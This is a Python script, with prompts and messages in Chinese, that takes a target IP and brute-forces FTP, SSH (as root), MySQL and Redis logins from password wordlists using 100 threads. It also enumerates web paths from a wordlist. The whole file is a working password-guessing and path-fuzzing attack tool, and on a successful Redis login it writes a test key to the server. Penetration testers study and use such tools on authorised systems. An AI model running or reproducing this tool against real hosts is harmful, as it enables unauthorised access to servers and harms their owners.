import concurrent.futures
from ftplib import FTP
import paramiko
import pymysql
import redis
import requests
def ftp(ip, password):
    try:
        ftp = FTP()
        ftp.connect(ip, 21)
        ftp.login("user", password)
        print(password + "密码正确"+"\n")
        ftp.close()
        return True
    except Exception as e:
        print(password + "密码不正确"+"\n")
        return False
def ssh(ip, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, 22, username="root", password=password)
        print(password + "密码正确"+"\n")
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        print(password + "密码不正确"+"\n")
        return False
def mysql(ip, password):
    try:
        conn = pymysql.connect(host=ip, port=3306, user="user", password=password, charset='utf8')
        print(password + "密码正确"+"\n")
        conn.close()
        return True
    except Exception as e:
        print(password + "密码不正确"+"\n")
        return False
def fredis(ip, password):
    try:
        r = redis.Redis(host=ip, port=6379, password=password, db=0)
        if r.ping():
            print(password + "密码正确"+"\n")
            r.set("test", "test")
            return True
        else:
            print(password + "无法连接到Redis")
            return False
    except Exception as e:
        print(password + "密码不正确"+"\n")
        return False
def path(ip, path_str):
    url = f"http://{ip}{path_str}"
    try:
        res = requests.get(url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0'})
        print(url, res.status_code)
    except Exception as e:
        print(f"访问 {url} 出错: {e}")
if __name__ == '__main__':
    ip = input("请输入IP:")
    function_choices = {
        "1": ftp,
        "2": ssh,
        "3": mysql,
        "4": fredis,
        "5": path
    }
    num = 1
    for func in function_choices.values():
        print(str(num) + "." + func.__name__)
        num += 1
    in_put = input("请选择你要执行的操作：")
    if in_put in function_choices:
        selected_function = function_choices[in_put]
        if selected_function in [ftp, ssh, mysql, fredis]:
            passwords = []
            file_name = ""
            if selected_function == ftp:
                file_name = "ftpfuzz"
            elif selected_function == ssh:
                file_name = "sshfuzz"
            elif selected_function == mysql:
                file_name = "mysqlfuzz"
            elif selected_function == fredis:
                file_name = "redisfuzz"
            with open(file_name, mode="r") as f:
                for line in f:
                    line = line.strip()
                    passwords.append(line)
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                future_to_password = {executor.submit(selected_function, ip, password): password for password in
                                      passwords}
                for future in concurrent.futures.as_completed(future_to_password):
                    password = future_to_password[future]
                    try:
                        if future.result():
                            break
                    except Exception as e:
                        print(f"线程执行出错: {e}")
        elif selected_function == path:
            paths = []
            with open("pathfuzz", mode="r") as f:
                for line in f:
                    line = line.strip()
                    paths.append(line)
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(lambda path_str: path(ip, path_str), paths)
    else:
        print("选择的操作不存在")
